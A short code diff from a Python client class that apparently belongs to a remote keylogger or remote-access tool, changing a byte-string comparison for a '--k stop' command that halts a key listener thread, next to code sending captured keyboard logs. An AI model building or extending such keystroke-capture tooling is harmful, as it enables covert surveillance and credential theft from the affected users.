@@ -263,7 +263,7 @@ class Client(object):
                     self.send(KeyboardLogs.encode())
                 continue
             
-            if data[0] == b'--k stop':
+            if data[0] == '--k stop':
                 if KeyListener.running:
                     KeyListener.stop()
                     threading.Thread.__init__(KeyListener) # re-initialise thread
